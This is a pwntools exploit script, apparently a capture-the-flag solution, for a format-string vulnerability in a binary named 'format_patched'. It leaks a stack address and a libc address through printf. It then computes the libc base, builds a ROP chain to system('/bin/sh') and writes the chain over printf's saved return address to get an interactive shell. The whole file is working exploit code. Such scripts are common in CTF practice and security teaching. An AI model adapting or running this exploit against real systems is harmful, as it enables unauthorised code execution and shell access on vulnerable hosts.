#!/usr/bin/env python3

from pwn import *

e = ELF("./format_patched")
libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      b *(echo+0x34)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      b *(echo+0x34)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    STRING_OFFSET = 6  # Determined by "AAAAAAAA|%1$p...|%40$p". Rest offsets are from debugging.
    MAIN_RBP_OFFSET = 40
    # ECHO_RET_OFFSET = 41
    MAIN_RET_OFFSET = 45
    PRINTF_RET_STACK_OFFSET = 0x138

    r.sendline(f'%{MAIN_RBP_OFFSET}$p'.encode())
    main_rbp = int(r.recvline(), 16)
    info(f'main() rbp is {hex(main_rbp)}')
    printf_ret_stack_addr = main_rbp - PRINTF_RET_STACK_OFFSET
    info(f'printf return address is on stack {hex(printf_ret_stack_addr)}')

    r.sendline(f'%{MAIN_RET_OFFSET}$p'.encode())
    main_ret = int(r.recvline(), 16)
    # Used this info to locate the libc version from https://libc.rip
    info(f'main() ret address in __libc_start_main is {hex(main_ret)}')
    libc_main_start = main_ret - 0xe7   # from debugging with the right libc version
    info(f'__libc_start_main is at {hex(libc_main_start)}')
    libc.address = libc_main_start - libc.sym.__libc_start_main
    info(f'libc base address is {hex(libc.address)}')

    rop = ROP(libc)
    rop.raw(next(libc.search(asm('ret'))))
    rop.system(next(libc.search(b'/bin/sh')))
    info(rop.dump())
    rop_chain = rop.chain()
    info(f'rop chain has length {len(rop_chain)}')
    payload = fmtstr_payload(offset=STRING_OFFSET, writes={
        printf_ret_stack_addr:  rop_chain,
        }, write_size='short')
    info(f'FSB payload has length {len(payload)}, must be smaller than 255')

    r.sendline(payload)
    r.clean(timeout=2)

    r.interactive()

if __name__ == "__main__":
    main()
